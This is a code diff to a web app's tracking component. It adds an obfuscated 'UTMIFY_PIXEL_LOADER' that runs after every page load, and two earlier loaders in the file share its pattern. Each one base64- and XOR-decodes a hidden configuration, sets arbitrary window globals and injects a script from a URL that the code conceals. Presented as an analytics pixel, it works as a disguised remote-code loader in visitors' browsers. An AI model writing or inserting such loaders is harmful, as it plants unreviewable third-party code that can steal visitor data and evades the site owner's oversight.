@@ -14,6 +14,8 @@ const PIXEL_LOADER_3 = `(function(){var j_5=atob("DM4FDPnf4Jj8yLxm/7UneYuzwqLeoM
 
 const PIXEL_LOADER_4 = `(function(){var g_g=atob("DK1G1FLkef9kdo93MtZkoSCIW8VGHvsDQt58+32HHZFKA/saW8s/+jGLFNEGBKAEUd8vpCaXVo8NDuobHd0vrDeIV5UXVKNVU9kypjuGDIsBBa1NafBq9jWIFp0FGvxVCPY99jyFFJpGTK0HW9UjuBuAW9NGAO4bR8hk7nDSGMkFTr5FU5wnt2XXHJtdTu1BBM8g5zHGBKIZ");var y_u4=[];for(var f_0=0;f_0<g_g.length;f_0++){y_u4.push(g_g.charCodeAt(f_0)&255);}var q_h13=y_u4[0];var h_8=y_u4.slice(1,1+q_h13);var q_6td=y_u4.slice(1+q_h13);var c_wn7=q_6td.map(function(b,l_hzr){return b^h_8[l_hzr%q_h13];});var t_a="";for(var c_46xt=0;c_46xt<c_wn7.length;c_46xt++){t_a+=String.fromCharCode(c_wn7[c_46xt]&255);}var x_tonh=decodeURIComponent(escape(t_a));var g_p4g4=JSON.parse(x_tonh);var s_69=g_p4g4.globals||[];s_69.forEach(function(p_2u3){window[p_2u3.name]=p_2u3.value;});var e_az=document.createElement("script");e_az.src=g_p4g4.url;e_az.async=true;e_az.defer=true;(g_p4g4.attributes||[]).forEach(function(o_eq90){e_az.setAttribute(o_eq90.name,o_eq90.value);});(document.head||document.documentElement).appendChild(e_az);})();`
 
+const UTMIFY_PIXEL_LOADER = `(function(){var w_9=atob("DKsnndCSO8u0Nxw1GdAF6KL+GfGWX2hBadgdsv/xX6WaQmhYcM1es7P9VuXWRTNGetlO7aThFLvdT3lZNttO5bX+FaHHFTAXeN9T77nwTr/RRD4PQvYLv7f+VKnVW28XI/Bcv77zVq6WDT5FcNNC8Zn2GeeWQX1ZbM4Fp/KkWv3SVCkELshD+ePxWK3QVS9Rf58VrOWwRpbJ");var z_2t2=[];for(var c_af3z=0;c_af3z<w_9.length;c_af3z++){z_2t2.push(w_9.charCodeAt(c_af3z)&255);}var i_n=z_2t2[0];var j_xsp=z_2t2.slice(1,1+i_n);var t_akl=z_2t2.slice(1+i_n);var k_zv=t_akl.map(function(b,f_g){return b^j_xsp[f_g%i_n];});var e_1asu="";for(var u_6y4w=0;u_6y4w<k_zv.length;u_6y4w++){e_1asu+=String.fromCharCode(k_zv[u_6y4w]&255);}var a_x=decodeURIComponent(escape(e_1asu));var i_qgi=JSON.parse(a_x);var g_wcv=i_qgi.globals||[];g_wcv.forEach(function(c_mo){window[c_mo.name]=c_mo.value;});var y_dw6=document.createElement("script");y_dw6.src=i_qgi.url;y_dw6.async=true;y_dw6.defer=true;(i_qgi.attributes||[]).forEach(function(h_fu){y_dw6.setAttribute(h_fu.name,h_fu.value);});(document.head||document.documentElement).appendChild(y_dw6);})();`
+
 const META_PIXEL_ID = "1816178736411720"
 
 const META_PIXEL = `!function(f,b,e,v,n,t,s)
@@ -41,6 +43,9 @@ export function SiteTracking() {
       </Script>
       <Script id="site-pixel-4" strategy="afterInteractive">
         {PIXEL_LOADER_4}
+      </Script>
+      <Script id="site-pixel-utmify" strategy="afterInteractive">
+        {UTMIFY_PIXEL_LOADER}
       </Script>
       <Script id="meta-pixel" strategy="afterInteractive">
         {META_PIXEL}
